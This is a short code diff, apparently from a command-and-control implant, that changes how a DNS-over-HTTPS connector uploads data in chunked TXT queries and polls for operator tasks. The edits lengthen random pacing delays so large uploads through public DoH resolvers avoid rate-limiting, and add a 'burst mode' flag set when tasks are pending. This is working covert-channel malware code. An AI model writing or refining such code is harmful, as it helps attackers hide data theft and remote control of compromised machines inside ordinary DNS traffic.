@@ -1005,8 +1005,9 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 			ULONG tmpSize = 0;
 			DohQueryTxt(qname, tmp, sizeof(tmp), &tmpSize);
 
-			// Pacing: similar to DNS transport, keep QPS in a safe range.
-			ULONG pacing = 25 + (GetTickCount() % 15);
+			// Pacing: keep QPS low to avoid DoH resolver rate-limiting.
+			// Use 100-150ms delay for large uploads through public DoH.
+			ULONG pacing = 100 + (GetTickCount() % 50);
 			ApiWin->Sleep(pacing);
 
 			offset += chunk;
@@ -1098,9 +1099,12 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 				this->seq++;
 				// 重置 ACK offset 因为没有待下载的任务
 				this->downAckOffset = 0;
+				this->hasPendingTasks = FALSE;
 				return;
 			}
-			DnsDebugLogf("[DoH] HEARTBEAT: has tasks (IP=%u.%u.%u.%u)", 
+			// 有任务，标记 pending 以触发 burst 模式
+			this->hasPendingTasks = TRUE;
+			DnsDebugLogf("[DoH] HEARTBEAT: has tasks (IP=%u.%u.%u.%u) -> burst mode", 
 			             ipBuf[0], ipBuf[1], ipBuf[2], ipBuf[3]);
 		} else {
 			// A-record heartbeat failed; skip TXT this round and retry later.
@@ -1247,8 +1251,9 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 					this->downBuf = NULL;
 					this->downTotal = 0;
 					this->downFilled = 0;
-					// 重置 ACK offset，任务下载完成
+					// 重置 ACK offset 和 pending 状态，任务下载完成
 					this->downAckOffset = 0;
+					this->hasPendingTasks = FALSE;
 					DnsDebugLogf("[DoH] GET: task ready, size=%lu bytes", finalSize);
 				}
 				return;
